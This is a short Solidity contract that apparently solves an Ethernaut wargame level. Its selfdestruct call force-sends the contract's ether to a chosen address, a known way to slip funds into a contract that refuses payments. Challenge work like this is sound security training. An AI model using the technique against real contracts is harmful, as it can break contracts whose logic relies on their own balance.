// SPDX-License-Identifier: MIT
// Original challenge at: https://ethernaut.openzeppelin.com/level/0x46f79002907a025599f355A04A512A6Fd45E671B
pragma solidity ^0.8.0;

contract TransferToContract {

    function transferToContract(address payable _to) payable public {
            selfdestruct(_to);
    }

    fallback() payable external {

    }

}